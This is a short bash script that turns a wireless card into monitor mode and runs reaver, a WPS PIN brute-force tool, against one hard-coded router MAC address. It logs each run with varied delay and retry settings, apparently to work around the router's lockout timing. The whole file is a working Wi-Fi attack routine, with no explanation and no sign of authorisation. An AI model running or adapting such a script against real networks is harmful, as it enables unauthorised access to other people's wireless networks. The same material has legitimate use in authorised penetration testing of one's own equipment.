#!/bin/bash

#GIVE X Y FOR -R
X=$1
Y=$2
D=$3
ATTEMPTS='2' #'11'
MAC='10:86:8C:C1:78:FE'

airmon-ng check kill
airmon-ng start wlan0
ifconfig wlan0mon up


set -x

CALL="reaver -i wlan0mon -b $MAC -vv -l 300 -g $ATTEMPTS -d $D -N -S -r $X:$Y"

filename="$X;$Y-$D.revtest"
echo "$CALL" >> "./xytime/$filename"

$CALL | tee "./xytime/$filename"

airmon-ng stop wlan0mon
service network-manager restart

exit
